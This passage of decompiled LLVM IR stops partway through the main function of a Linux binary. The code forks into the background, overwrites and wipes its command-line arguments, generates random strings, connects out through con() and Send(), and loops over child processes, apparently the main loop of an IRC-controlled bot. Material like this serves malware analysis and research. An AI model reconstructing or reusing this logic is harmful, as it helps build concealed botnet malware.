  uselistorder i32 %stack_var_-8.1, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_804ac05, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804ac00, { 2, 3, 5, 4, 7, 6, 0, 1, 8, 9 }
  uselistorder i32 %v0_804abef, { 1, 0 }
  uselistorder i32 %v3_804abb6, { 2, 1, 0 }
  uselistorder i32 %v0_804abad, { 2, 1, 0 }
  uselistorder i32 %v2_804ac39, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 5, 1, 0, 2, 4, 3, 7, 6 }
  uselistorder i32* %stack_var_-32, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %stack_var_0, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 18, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40 }
  uselistorder i32 (i32)* @sleep, { 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @connect, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ad5a, { 1, 0 }
  uselistorder label %dec_label_pc_804ace8, { 1, 0 }
  uselistorder label %dec_label_pc_804ac6b, { 1, 0 }
  uselistorder label %dec_label_pc_804ab66.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804aba3, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp75 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-28 = alloca i8*, align 4
  %tmp78 = call i32 @__decompiler_undefined_function_0()
  %tmp84 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1480 = alloca i32, align 4
  %stack_var_-2504 = alloca i32, align 4
  %stack_var_-6600 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-456 = alloca i32, align 4
  %stack_var_-6672 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804ad95 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804ad95, i32* @ecx, align 4
  store i32 %v2_804ad95, i32* %stack_var_-20, align 4
  %v1_804adb1 = call i32 @fork(i32 %v2_804ad95)
  store i32 %v1_804adb1, i32* %eax.global-to-local, align 4
  %v1_804adb6 = icmp eq i32 %v1_804adb1, 0
  br i1 %v1_804adb6, label %entry.dec_label_pc_804adc4_crit_edge, label %dec_label_pc_804adba

entry.dec_label_pc_804adc4_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804adc4

dec_label_pc_804adba:                             ; preds = %entry
  %v1_804adbf = call i32 @__GI_exit(i32 0)
  store i32 %v1_804adbf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804adc4

dec_label_pc_804adc4:                             ; preds = %entry.dec_label_pc_804adc4_crit_edge, %dec_label_pc_804adba
  store i32 %v2_804ad95, i32* %edx.global-to-local, align 4
  %v1_804adca = add i32 %v2_804ad95, 4
  %v2_804adca = inttoptr i32 %v1_804adca to i32*
  %v3_804adca = load i32, i32* %v2_804adca, align 4
  store i32 %v3_804adca, i32* %eax.global-to-local, align 4
  %v1_804adcd = inttoptr i32 %v3_804adca to i32*
  %v2_804adcd = load i32, i32* %v1_804adcd, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804adda = and i32 %v2_804adcd, -256
  store i32 %v1_804adda, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804addd = inttoptr i32 %v2_804adcd to i8*
  %v3_804ade3 = call i32 @_strlen(i8* %v4_804addd)
  %v4_804ade3 = mul i32 %v3_804ade3, -1
  %v1_804ade7 = sub i32 1, %v4_804ade3
  store i32 %v1_804ade7, i32* %eax.global-to-local, align 4
  %v1_804ade9 = sub i32 0, %v4_804ade3
  store i32 %v1_804ade9, i32* %edx.global-to-local, align 4
  store i32 %v2_804ad95, i32* %ecx.global-to-local, align 4
  %v3_804adf2 = load i32, i32* %v2_804adca, align 4
  store i32 %v3_804adf2, i32* %eax.global-to-local, align 4
  %v1_804adf5 = inttoptr i32 %v3_804adf2 to i32*
  %v2_804adf5 = load i32, i32* %v1_804adf5, align 4
  store i32 %v2_804adf5, i32* %eax.global-to-local, align 4
  store i32 %v2_804adf5, i32* %stack_var_-6672, align 4
  %v4_804ae01 = inttoptr i32 %v2_804adf5 to i8*
  %v5_804ae01 = call i32 @strncpy(i8* %v4_804ae01, i32 ptrtoint ([6 x i8]* @global_var_805b152.124 to i32), i32 %v1_804ade9)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v2_804ad95, i32* @edi, align 4
  %v3_804ae6c166 = load i32, i32* %stack_var_4, align 4
  %v5_804ae6e174 = icmp sgt i32 %v3_804ae6c166, 1
  br i1 %v5_804ae6e174, label %dec_label_pc_804ae12, label %dec_label_pc_804ae70

dec_label_pc_804ae12:                             ; preds = %dec_label_pc_804adc4, %dec_label_pc_804ae12
  %storemerge11175 = phi i32 [ %v4_804ae60, %dec_label_pc_804ae12 ], [ 1, %dec_label_pc_804adc4 ]
  %v2_804ae15 = mul i32 %storemerge11175, 4
  store i32 %v2_804ae15, i32* %eax.global-to-local, align 4
  %v4_804ae1e = load i32, i32* %v2_804adca, align 4
  %v5_804ae1e = add i32 %v4_804ae1e, %v2_804ae15
  store i32 %v5_804ae1e, i32* %eax.global-to-local, align 4
  %v1_804ae21 = inttoptr i32 %v5_804ae1e to i32*
  %v2_804ae21 = load i32, i32* %v1_804ae21, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804ae2e = and i32 %v2_804ae21, -256
  store i32 %v1_804ae2e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804ae31 = inttoptr i32 %v2_804ae21 to i8*
  store i32 %v2_804ae21, i32* @edi, align 4
  %v3_804ae37 = call i32 @_strlen(i8* %v4_804ae31)
  store i32 %v3_804ae37, i32* %edx.global-to-local, align 4
  store i32 %v2_804ae15, i32* %eax.global-to-local, align 4
  store i32 %v2_804ad95, i32* %ecx.global-to-local, align 4
  %v4_804ae4c = load i32, i32* %v2_804adca, align 4
  %v5_804ae4c = add i32 %v4_804ae4c, %v2_804ae15
  store i32 %v5_804ae4c, i32* %eax.global-to-local, align 4
  %v1_804ae4f = inttoptr i32 %v5_804ae4c to i32*
  %v2_804ae4f = load i32, i32* %v1_804ae4f, align 4
  store i32 %v2_804ae4f, i32* %eax.global-to-local, align 4
  store i32 %v2_804ae4f, i32* %stack_var_-6672, align 4
  %v4_804ae58 = inttoptr i32 %v2_804ae4f to i8*
  %v5_804ae58 = call i32 @__GI_memset(i8* %v4_804ae58, i32 0, i32 %v3_804ae37)
  %v4_804ae60 = add i32 %storemerge11175, 1
  store i32 %v4_804ae60, i32* %eax.global-to-local, align 4
  store i32 %v2_804ad95, i32* @edi, align 4
  %v3_804ae6c = load i32, i32* %stack_var_4, align 4
  %v5_804ae6e = icmp slt i32 %v4_804ae60, %v3_804ae6c
  br i1 %v5_804ae6e, label %dec_label_pc_804ae12, label %dec_label_pc_804ae70

dec_label_pc_804ae70:                             ; preds = %dec_label_pc_804ae12, %dec_label_pc_804adc4
  %stack_var_-6624.0.lcssa = phi i32 [ %tmp84, %dec_label_pc_804adc4 ], [ %v2_804ae21, %dec_label_pc_804ae12 ]
  %stack_var_-6668.0.lcssa = phi i8* [ getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b152.124, i32 0, i32 0), %dec_label_pc_804adc4 ], [ null, %dec_label_pc_804ae12 ]
  store i32 0, i32* %stack_var_-6672, align 4
  %v2_804ae75 = call i32 @__GI_time(i32* null)
  store i32 %v2_804ae75, i32* %eax.global-to-local, align 4
  store i32 %v2_804ae75, i32* @ebx, align 4
  %v1_804ae7f = call i32 @__libc_getpid(i32 0)
  store i32 %v1_804ae7f, i32* %eax.global-to-local, align 4
  %v0_804ae84 = load i32, i32* @ebx, align 4
  %v2_804ae84 = xor i32 %v0_804ae84, %v1_804ae7f
  store i32 %v2_804ae84, i32* @ebx, align 4
  %v0_804ae86 = load i32, i32* %stack_var_-6672, align 4
  %v1_804ae86 = call i32 @getppid(i32 %v0_804ae86)
  %v0_804ae8b = load i32, i32* @ebx, align 4
  %v2_804ae8b = add i32 %v0_804ae8b, %v1_804ae86
  store i32 %v2_804ae8b, i32* %eax.global-to-local, align 4
  store i32 %v2_804ae8b, i32* %stack_var_-6672, align 4
  %v1_804ae92 = call i32 @srand(i32 %v2_804ae8b)
  store i32 %v1_804ae92, i32* %eax.global-to-local, align 4
  %v0_804ae9a = call i32 @makestring()
  store i32 %v0_804ae9a, i32* %eax.global-to-local, align 4
  store i32 %v0_804ae9a, i32* @global_var_8067524.101, align 4
  %v0_804aea4 = call i32 @makestring()
  store i32 %v0_804aea4, i32* %eax.global-to-local, align 4
  store i32 %v0_804aea4, i32* @global_var_8067520.36, align 32
  %v0_804aeae = call i32 @makestring()
  store i32 %v0_804aeae, i32* %eax.global-to-local, align 4
  store i32 %v0_804aeae, i32* @global_var_806752c.125, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805b158.126 to i32), i32* @global_var_8067648.100, align 8
  store i32 ptrtoint ([10 x i8]* @global_var_805b161.127 to i32), i32* @global_var_8067644.112, align 4
  store i32 0, i32* @global_var_8067640.80, align 64
  %v2_804af14 = ptrtoint i32* %stack_var_-456 to i32
  %tmp107 = bitcast i32* %stack_var_-456 to i8*
  %v2_804af5c = ptrtoint i32* %stack_var_-328 to i32
  %v2_804b0c0 = ptrtoint i32* %stack_var_-6600 to i32
  %v2_804b190 = ptrtoint i32* %stack_var_-2504 to i32
  %v2_804b1e7 = ptrtoint i32* %stack_var_-1480 to i32
  %tmp108 = bitcast i8** %stack_var_-28 to i32*
  %v2_804af00 = ptrtoint i8* %stack_var_-6668.0.lcssa to i32
  br label %dec_label_pc_804aed8

dec_label_pc_804aed8:                             ; preds = %dec_label_pc_804b0b4, %dec_label_pc_804af0a, %dec_label_pc_804b26a, %dec_label_pc_804ae70
  %stack_var_-6628.0 = phi i8* [ %tmp75, %dec_label_pc_804ae70 ], [ %stack_var_-6628.2.ph, %dec_label_pc_804b26a ], [ %stack_var_-6628.1.ph.ph115, %dec_label_pc_804af0a ], [ %stack_var_-6628.1.ph.ph115, %dec_label_pc_804b0b4 ]
  %stack_var_-36.0 = phi i32 [ %tmp78, %dec_label_pc_804ae70 ], [ %stack_var_-36.3.lcssa, %dec_label_pc_804b26a ], [ %stack_var_-36.1, %dec_label_pc_804af0a ], [ %stack_var_-36.3.lcssa, %dec_label_pc_804b0b4 ]
  %v0_804aed8 = call i32 @con()
  %v0_804aedd = load i32, i32* @global_var_806752c.125, align 4
  store i32 %v0_804aedd, i32* %eax.global-to-local, align 4
  %v0_804aee2 = load i32, i32* @global_var_8067520.36, align 32
  store i32 %v0_804aee2, i32* %edx.global-to-local, align 4
  %v0_804aee8 = load i32, i32* @global_var_8067524.101, align 4
  store i32 %v0_804aee8, i32* %ecx.global-to-local, align 4
  %v0_804aeee = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804aeee, i32* @ebx, align 4
  %v0_804aef4 = load i32, i32* @esp, align 4
  %v2_804aef7 = add i32 %v0_804aef4, -16
  %v3_804aef7 = inttoptr i32 %v2_804aef7 to i32*
  store i32 %v0_804aedd, i32* %v3_804aef7, align 4
  %v0_804aef8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804aef8 = add i32 %v0_804aef4, -20
  %v3_804aef8 = inttoptr i32 %v2_804aef8 to i32*
  store i32 %v0_804aef8, i32* %v3_804aef8, align 4
  %v0_804aef9 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804aef9 = add i32 %v0_804aef4, -24
  %v3_804aef9 = inttoptr i32 %v2_804aef9 to i32*
  store i32 %v0_804aef9, i32* %v3_804aef9, align 4
  %v1_804aefa = add i32 %v0_804aef4, -28
  %v2_804aefa = inttoptr i32 %v1_804aefa to i32*
  store i32 ptrtoint ([41 x i8]* @global_var_805b16c.128 to i32), i32* %v2_804aefa, align 4
  %v0_804aeff = load i32, i32* @ebx, align 4
  %v2_804aeff = add i32 %v0_804aef4, -32
  %v3_804aeff = inttoptr i32 %v2_804aeff to i32*
  store i32 %v0_804aeff, i32* %v3_804aeff, align 4
  %v0_804af00 = load i32, i32* %stack_var_-6672, align 4
  %v3_804af00 = call i32 @Send(i32 %v0_804af00, i32 %v2_804af00)
  store i32 %v3_804af00, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af0a.outer.outer

dec_label_pc_804af0a.outer.outer:                 ; preds = %dec_label_pc_804b289, %dec_label_pc_804b2a8, %dec_label_pc_804aed8
  %stack_var_-6628.1.ph.ph115 = phi i8* [ %stack_var_-6628.0, %dec_label_pc_804aed8 ], [ %stack_var_-6628.331, %dec_label_pc_804b2a8 ], [ %stack_var_-6628.2.ph, %dec_label_pc_804b289 ]
  %stack_var_-36.1.ph.ph = phi i32 [ %stack_var_-36.0, %dec_label_pc_804aed8 ], [ %stack_var_-36.3.lcssa, %dec_label_pc_804b2a8 ], [ %stack_var_-36.3.lcssa, %dec_label_pc_804b289 ]
  br label %dec_label_pc_804af0a.outer

dec_label_pc_804af0a.outer:                       ; preds = %dec_label_pc_804af0a.outer.outer, %dec_label_pc_804b0dd
  %stack_var_-36.1.ph = phi i32 [ %stack_var_-36.3.lcssa, %dec_label_pc_804b0dd ], [ %stack_var_-36.1.ph.ph, %dec_label_pc_804af0a.outer.outer ]
  br label %dec_label_pc_804af0a

dec_label_pc_804af0a:                             ; preds = %dec_label_pc_804af0a.outer, %dec_label_pc_804b08f
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.3.lcssa, %dec_label_pc_804b08f ], [ %stack_var_-36.1.ph, %dec_label_pc_804af0a.outer ]
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  store i32 %v2_804af14, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804af1b = call i8* @_memset(i8* %tmp107, i32 0, i32 32)
  %v6_804af1b = ptrtoint i8* %v5_804af1b to i32
  store i32 %v6_804af1b, i32* %ecx.global-to-local, align 4
  %v0_804af23 = load i32, i32* @global_var_8067528.28, align 8
  %v2_804af2a = udiv i32 %v0_804af23, 32
  store i32 %v2_804af2a, i32* %edx.global-to-local, align 4
  %v1_804af32 = urem i32 %v0_804af23, 32
  store i32 %v1_804af32, i32* %eax.global-to-local, align 4
  %v0_804af35 = load i32, i32* @ebp, align 4
  %v2_804af35 = mul nuw nsw i32 %v2_804af2a, 4
  %v3_804af35 = add nsw i32 %v2_804af35, -448
  %v4_804af35 = add i32 %v3_804af35, %v0_804af35
  %v5_804af35 = inttoptr i32 %v4_804af35 to i32*
  %v6_804af35 = load i32, i32* %v5_804af35, align 4
  %v9_804af35 = shl i32 1, %v1_804af32
  %v12_804af35 = or i32 %v6_804af35, %v9_804af35
  store i32 %v12_804af35, i32* %v5_804af35, align 4
  store i32 1200, i32* %stack_var_-328, align 4
  %v0_804af51 = load i32, i32* @global_var_8067528.28, align 8
  %v1_804af56 = add i32 %v0_804af51, 1
  store i32 %v1_804af56, i32* %edx.global-to-local, align 4
  %v0_804af59 = load i32, i32* @esp, align 4
  %v2_804af62 = add i32 %v0_804af59, -16
  %v3_804af62 = inttoptr i32 %v2_804af62 to i32*
  store i32 %v2_804af5c, i32* %v3_804af62, align 4
  %v1_804af63 = add i32 %v0_804af59, -20
  %v2_804af63 = inttoptr i32 %v1_804af63 to i32*
  store i32 0, i32* %v2_804af63, align 4
  %v1_804af65 = add i32 %v0_804af59, -24
  %v2_804af65 = inttoptr i32 %v1_804af65 to i32*
  store i32 0, i32* %v2_804af65, align 4
  store i32 %v2_804af14, i32* %eax.global-to-local, align 4
  %v2_804af6d = add i32 %v0_804af59, -28
  %v3_804af6d = inttoptr i32 %v2_804af6d to i32*
  store i32 %v2_804af14, i32* %v3_804af6d, align 4
  %v0_804af6e = load i32, i32* %edx.global-to-local, align 4
  %v2_804af6e = add i32 %v0_804af59, -32
  %v3_804af6e = inttoptr i32 %v2_804af6e to i32*
  store i32 %v0_804af6e, i32* %v3_804af6e, align 4
  %v0_804af6f = load i32, i32* %stack_var_-328, align 4
  %v5_804af6f = call i32 @__libc_select(i32 %v0_804af6f, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804af6f, i32* %eax.global-to-local, align 4
  %v0_804af74 = load i32, i32* @esp, align 4
  %v1_804af74 = add i32 %v0_804af74, 32
  %tmp109 = icmp slt i32 %v5_804af6f, 1
  br i1 %tmp109, label %dec_label_pc_804aed8, label %dec_label_pc_804b081.preheader

dec_label_pc_804b081.preheader:                   ; preds = %dec_label_pc_804af0a
  %v0_804b081143 = load i32, i32* @global_var_8062a90.30, align 16
  store i32 %v0_804b081143, i32* %eax.global-to-local, align 4
  %v10_804b086145 = icmp eq i32 %v0_804b081143, 0
  br i1 %v10_804b086145, label %dec_label_pc_804b08f, label %dec_label_pc_804af8b

dec_label_pc_804af8b:                             ; preds = %dec_label_pc_804b081.preheader, %dec_label_pc_804b07e
  %storemerge8153 = phi i32 [ %.pre53, %dec_label_pc_804b07e ], [ 0, %dec_label_pc_804b081.preheader ]
  %stack_var_-36.3152 = phi i32 [ %stack_var_-36.2, %dec_label_pc_804b07e ], [ %stack_var_-36.1, %dec_label_pc_804b081.preheader ]
  %v0_804af9d151 = phi i32 [ %v0_804b0b945, %dec_label_pc_804b07e ], [ %v1_804af74, %dec_label_pc_804b081.preheader ]
  %v2_804af8e = mul i32 %storemerge8153, 4
  store i32 %v2_804af8e, i32* %edx.global-to-local, align 4
  %v0_804af93 = load i32, i32* @global_var_806764c.31, align 4
  %v2_804af98 = add i32 %v0_804af93, %v2_804af8e
  store i32 %v2_804af98, i32* %eax.global-to-local, align 4
  %v1_804af9b = inttoptr i32 %v2_804af98 to i32*
  %v2_804af9b = load i32, i32* %v1_804af9b, align 4
  store i32 %v2_804af9b, i32* %eax.global-to-local, align 4
  %v1_804afa0 = add i32 %v0_804af9d151, -8
  %v2_804afa0 = inttoptr i32 %v1_804afa0 to i32*
  store i32 1, i32* %v2_804afa0, align 4
  %v1_804afa2 = add i32 %v0_804af9d151, -12
  %v2_804afa2 = inttoptr i32 %v1_804afa2 to i32*
  store i32 0, i32* %v2_804afa2, align 4
  %v0_804afa4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804afa4 = add i32 %v0_804af9d151, -16
  %v3_804afa4 = inttoptr i32 %v2_804afa4 to i32*
  store i32 %v0_804afa4, i32* %v3_804afa4, align 4
  %v4_804afa5 = call i32 @waitpid(i32 %storemerge8153, i32 %v6_804af1b, i32 %v2_804af14, i32 %stack_var_-36.3152)
  store i32 %v4_804afa5, i32* %eax.global-to-local, align 4
  %v0_804afaa = load i32, i32* @esp, align 4
  %tmp110 = icmp slt i32 %v4_804afa5, 1
  %.pre53 = add i32 %storemerge8153, 1
  br i1 %tmp110, label %dec_label_pc_804b07e, label %dec_label_pc_804afb5

dec_label_pc_804afb5:                             ; preds = %dec_label_pc_804af8b
  %v0_804afe8128 = load i32, i32* @global_var_8062a90.30, align 16
  %v10_804afed129 = icmp ult i32 %.pre53, %v0_804afe8128
  %v2_804afc1130 = mul i32 %.pre53, 4
  store i32 %v2_804afc1130, i32* %edx.global-to-local, align 4
  %v0_804afc6131 = load i32, i32* @global_var_806764c.31, align 4
  %v2_804afcb132 = add i32 %v0_804afc6131, %v2_804afc1130
  store i32 %v2_804afcb132, i32* %eax.global-to-local, align 4
  %v1_804afce133 = add i32 %v2_804afcb132, -4
  br i1 %v10_804afed129, label %dec_label_pc_804afbe, label %dec_label_pc_804aff2

dec_label_pc_804afbe:                             ; preds = %dec_label_pc_804afb5, %dec_label_pc_804afbe
  %v1_804afce137 = phi i32 [ %v1_804afce, %dec_label_pc_804afbe ], [ %v1_804afce133, %dec_label_pc_804afb5 ]
  %v2_804afcb136 = phi i32 [ %v2_804afcb, %dec_label_pc_804afbe ], [ %v2_804afcb132, %dec_label_pc_804afb5 ]
  %v2_804afc1135 = phi i32 [ %v2_804afc1, %dec_label_pc_804afbe ], [ %v2_804afc1130, %dec_label_pc_804afb5 ]
  %storemerge10134 = phi i32 [ %v4_804afe5, %dec_label_pc_804afbe ], [ %.pre53, %dec_label_pc_804afb5 ]
  store i32 %v1_804afce137, i32* @ecx, align 4
  store i32 %v2_804afc1135, i32* %edx.global-to-local, align 4
  store i32 %v2_804afcb136, i32* %eax.global-to-local, align 4
  %v1_804afe1 = inttoptr i32 %v2_804afcb136 to i32*
  %v2_804afe1 = load i32, i32* %v1_804afe1, align 4
  %v2_804afe3 = inttoptr i32 %v1_804afce137 to i32*
  store i32 %v2_804afe1, i32* %v2_804afe3, align 4
  %v4_804afe5 = add i32 %storemerge10134, 1
  %v0_804afe8 = load i32, i32* @global_var_8062a90.30, align 16
  %v10_804afed = icmp ult i32 %v4_804afe5, %v0_804afe8
  %v2_804afc1 = mul i32 %v4_804afe5, 4
  store i32 %v2_804afc1, i32* %edx.global-to-local, align 4
  %v0_804afc6 = load i32, i32* @global_var_806764c.31, align 4
  %v2_804afcb = add i32 %v0_804afc6, %v2_804afc1
  store i32 %v2_804afcb, i32* %eax.global-to-local, align 4
  %v1_804afce = add i32 %v2_804afcb, -4
  br i1 %v10_804afed, label %dec_label_pc_804afbe, label %dec_label_pc_804aff2

dec_label_pc_804aff2:                             ; preds = %dec_label_pc_804afbe, %dec_label_pc_804afb5
  %storemerge10.lcssa = phi i32 [ %.pre53, %dec_label_pc_804afb5 ], [ %v4_804afe5, %dec_label_pc_804afbe ]
  %v1_804afce.lcssa = phi i32 [ %v1_804afce133, %dec_label_pc_804afb5 ], [ %v1_804afce, %dec_label_pc_804afbe ]
  %v1_804b005 = inttoptr i32 %v1_804afce.lcssa to i32*
  store i32 0, i32* %v1_804b005, align 4
  %v0_804b00b = load i32, i32* @global_var_8062a90.30, align 16
  %v1_804b010 = add i32 %v0_804b00b, -1
  store i32 %v1_804b010, i32* @global_var_8062a90.30, align 16
  %v2_804b01b = mul i32 %v1_804b010, 4
  %v1_804b01e = add i32 %v2_804b01b, 4
  store i32 %v1_804b01e, i32* %eax.global-to-local, align 4
  %v0_804b021 = load i32, i32* @esp, align 4
  %v2_804b024 = add i32 %v0_804b021, -16
  %v3_804b024 = inttoptr i32 %v2_804b024 to i32*
  store i32 %v1_804b01e, i32* %v3_804b024, align 4
  %v1_804b025 = call i32 @malloc(i32 %storemerge10.lcssa)
  %v0_804b02a = load i32, i32* @esp, align 4
  %v1_804b02a = add i32 %v0_804b02a, 16
  %v0_804b05b139 = load i32, i32* @global_var_8062a90.30, align 16
  store i32 %v0_804b05b139, i32* %eax.global-to-local, align 4
  %v10_804b060140 = icmp eq i32 %v0_804b05b139, 0
  br i1 %v10_804b060140, label %dec_label_pc_804b065, label %dec_label_pc_804b039

dec_label_pc_804b039:                             ; preds = %dec_label_pc_804aff2, %dec_label_pc_804b039
  %storemerge9141 = phi i32 [ %v4_804b058, %dec_label_pc_804b039 ], [ 0, %dec_label_pc_804aff2 ]
  %v2_804b03c = mul i32 %storemerge9141, 4
  %v5_804b041 = add i32 %v2_804b03c, %v1_804b025
  store i32 %v5_804b041, i32* @ecx, align 4
  store i32 %v2_804b03c, i32* %edx.global-to-local, align 4
  %v0_804b04c = load i32, i32* @global_var_806764c.31, align 4
  %v2_804b051 = add i32 %v0_804b04c, %v2_804b03c
  store i32 %v2_804b051, i32* %eax.global-to-local, align 4
  %v1_804b054 = inttoptr i32 %v2_804b051 to i32*
  %v2_804b054 = load i32, i32* %v1_804b054, align 4
  %v2_804b056 = inttoptr i32 %v5_804b041 to i32*
  store i32 %v2_804b054, i32* %v2_804b056, align 4
  %v4_804b058 = add i32 %storemerge9141, 1
  %v0_804b05b = load i32, i32* @global_var_8062a90.30, align 16
  store i32 %v0_804b05b, i32* %eax.global-to-local, align 4
  %v10_804b060 = icmp ult i32 %v4_804b058, %v0_804b05b
  br i1 %v10_804b060, label %dec_label_pc_804b039, label %dec_label_pc_804b05b.dec_label_pc_804b065_crit_edge

dec_label_pc_804b05b.dec_label_pc_804b065_crit_edge: ; preds = %dec_label_pc_804b039
  %v0_804b06a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b065

dec_label_pc_804b065:                             ; preds = %dec_label_pc_804aff2, %dec_label_pc_804b05b.dec_label_pc_804b065_crit_edge
  %v0_804b06a = phi i32 [ %v0_804b06a.pre, %dec_label_pc_804b05b.dec_label_pc_804b065_crit_edge ], [ %v1_804b02a, %dec_label_pc_804aff2 ]
  %storemerge9.lcssa = phi i32 [ %v4_804b058, %dec_label_pc_804b05b.dec_label_pc_804b065_crit_edge ], [ 0, %dec_label_pc_804aff2 ]
  %v0_804b065 = load i32, i32* @global_var_806764c.31, align 4
  store i32 %v0_804b065, i32* %eax.global-to-local, align 4
  %v2_804b06d = add i32 %v0_804b06a, -16
  %v3_804b06d = inttoptr i32 %v2_804b06d to i32*
  store i32 %v0_804b065, i32* %v3_804b06d, align 4
  %v1_804b06e = call i32 @free(i32 %storemerge9.lcssa)
  %v0_804b073 = load i32, i32* @esp, align 4
  store i32 %v1_804b025, i32* %eax.global-to-local, align 4
  store i32 %v1_804b025, i32* @global_var_806764c.31, align 4
  br label %dec_label_pc_804b07e

dec_label_pc_804b07e:                             ; preds = %dec_label_pc_804af8b, %dec_label_pc_804b065
  %v0_804b0b945.in = phi i32 [ %v0_804b073, %dec_label_pc_804b065 ], [ %v0_804afaa, %dec_label_pc_804af8b ]
  %stack_var_-36.2 = phi i32 [ %v1_804b025, %dec_label_pc_804b065 ], [ %stack_var_-36.3152, %dec_label_pc_804af8b ]
  %v0_804b0b945 = add i32 %v0_804b0b945.in, 16
  %v0_804b081 = load i32, i32* @global_var_8062a90.30, align 16
  store i32 %v0_804b081, i32* %eax.global-to-local, align 4
  %v10_804b086 = icmp ult i32 %.pre53, %v0_804b081
  br i1 %v10_804b086, label %dec_label_pc_804af8b, label %dec_label_pc_804b08f

dec_label_pc_804b08f:                             ; preds = %dec_label_pc_804b081.preheader, %dec_label_pc_804b07e
  %v0_804af9d.lcssa = phi i32 [ %v1_804af74, %dec_label_pc_804b081.preheader ], [ %v0_804b0b945, %dec_label_pc_804b07e ]
  %stack_var_-36.3.lcssa = phi i32 [ %stack_var_-36.1, %dec_label_pc_804b081.preheader ], [ %stack_var_-36.2, %dec_label_pc_804b07e ]
  %storemerge8.lcssa = phi i32 [ 0, %dec_label_pc_804b081.preheader ], [ %.pre53, %dec_label_pc_804b07e ]
  %v0_804b08f = load i32, i32* @global_var_8067528.28, align 8
  %v1_804b096 = urem i32 %v0_804b08f, 32
  store i32 %v1_804b096, i32* %edx.global-to-local, align 4
  %v2_804b09e = udiv i32 %v0_804b08f, 32
  store i32 %v2_804b09e, i32* %eax.global-to-local, align 4
  %v0_804b0a1 = load i32, i32* @ebp, align 4
  %v2_804b0a1 = mul nuw nsw i32 %v2_804b09e, 4
  %v3_804b0a1 = add nsw i32 %v2_804b0a1, -448
  %v4_804b0a1 = add i32 %v3_804b0a1, %v0_804b0a1
  %v5_804b0a1 = inttoptr i32 %v4_804b0a1 to i32*
  %v6_804b0a1 = load i32, i32* %v5_804b0a1, align 4
  %v9_804b0a1 = shl i32 1, %v1_804b096
  %v10_804b0a1 = and i32 %v6_804b0a1, %v9_804b0a1
  %v11_804b0a1 = icmp ne i32 %v10_804b0a1, 0
  %v1_804b0a9 = zext i1 %v11_804b0a1 to i32
  %v3_804b0a9 = and i32 %v2_804b09e, 134217472
  %v4_804b0a9 = or i32 %v1_804b0a9, %v3_804b0a9
  store i32 %v4_804b0a9, i32* %eax.global-to-local, align 4
  %v4_804b0ac = icmp eq i1 %v11_804b0a1, false
  br i1 %v4_804b0ac, label %dec_label_pc_804af0a, label %dec_label_pc_804b0b4

dec_label_pc_804b0b4:                             ; preds = %dec_label_pc_804b08f
  store i32 %v0_804b08f, i32* %eax.global-to-local, align 4
  %v1_804b0b9 = add i32 %v0_804af9d.lcssa, -4
  %v2_804b0b9 = inttoptr i32 %v1_804b0b9 to i32*
  store i32 0, i32* %v2_804b0b9, align 4
  %v1_804b0bb = add i32 %v0_804af9d.lcssa, -8
  %v2_804b0bb = inttoptr i32 %v1_804b0bb to i32*
  store i32 4096, i32* %v2_804b0bb, align 4
  store i32 %v2_804b0c0, i32* %edx.global-to-local, align 4
  %v2_804b0c6 = add i32 %v0_804af9d.lcssa, -12
  %v3_804b0c6 = inttoptr i32 %v2_804b0c6 to i32*
  store i32 %v2_804b0c0, i32* %v3_804b0c6, align 4
  %v0_804b0c7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b0c7 = add i32 %v0_804af9d.lcssa, -16
  %v3_804b0c7 = inttoptr i32 %v2_804b0c7 to i32*
  store i32 %v0_804b0c7, i32* %v3_804b0c7, align 4
